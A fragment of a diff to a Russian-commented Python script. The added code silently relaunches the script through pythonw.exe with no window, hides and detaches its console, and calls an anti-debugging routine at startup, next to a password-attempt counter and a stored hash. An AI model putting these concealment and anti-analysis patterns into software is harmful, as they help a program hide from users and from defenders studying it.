@@ -47,9 +47,21 @@ attempts_left = MAX_ATTEMPTS
 # ========== СКРЫТИЕ CMD ==========
 def hide_console():
     try:
+        # Если запущено через python.exe - перезапускаем через pythonw.exe
+        if sys.executable.endswith("python.exe"):
+            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+            if os.path.exists(pythonw_path):
+                subprocess.Popen([pythonw_path, __file__] + sys.argv[1:], 
+                               creationflags=0x08000000)  # CREATE_NO_WINDOW
+                os._exit(0)
+        
+        # Скрываем окно консоли
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
             ctypes.windll.user32.ShowWindow(hwnd, 0)
+        
+        # Открепляем от консоли
+        ctypes.windll.kernel32.FreeConsole()
     except:
         pass
 
@@ -760,7 +772,7 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
 
 # ========== ТОЧКА ВХОДА ==========
 if __name__ == "__main__":
-    # Скрываем консоль сразу
+    # Скрываем консоль СРАЗУ
     hide_console()
     
     anti_debug()
